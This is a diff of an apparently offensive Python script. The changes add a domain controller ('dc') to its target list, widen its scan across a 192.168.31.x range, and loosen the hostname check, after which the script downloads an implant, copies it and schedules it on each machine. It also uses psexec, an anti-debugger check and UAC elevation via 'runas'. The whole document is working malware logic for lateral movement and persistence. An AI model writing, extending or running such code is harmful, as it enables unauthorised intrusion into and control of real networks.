@@ -35,7 +35,7 @@ NUM_CORES = 4
 ASADMIN = 'asadmin'
 pexecPath = 'C:\\temp\\psexec.exe'
 cmdshell = "cmd.exe"
-computers = ["NOTAVICTIM7", "JUMPBOX-PC"]
+computers = ["dc","NOTAVICTIM7","jumpbox-PC"]
 kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
 IsDebuggerPresent = kernel32.IsDebuggerPresent
 remoteNet = "192.168.251."
@@ -176,7 +176,7 @@ if __name__ == '__main__':
             params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
             shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
 
-        for ip in range(1,2):
+        for ip in range(1,20):
             netRange = '192.168.31.'
             host = netRange + str(ip)
             hosts.append(host)
@@ -196,15 +196,17 @@ if __name__ == '__main__':
             print ("Current test is " + i)
             if i == os.environ['COMPUTERNAME']:
                 print ("Computer Name is " + i)
+                run = True
                 if i == 'NOTAVICTIM7':
                     debug = 1
                 else:
                     debug = 0
                 break
             else:
-                print ("Sorry wrong computer")
-                sys.exit(1)
+                pass
 
+        if run == False:
+            sys.exit(1)
         download_Implant()
         implant_Copy()
         computer_Scheduler()
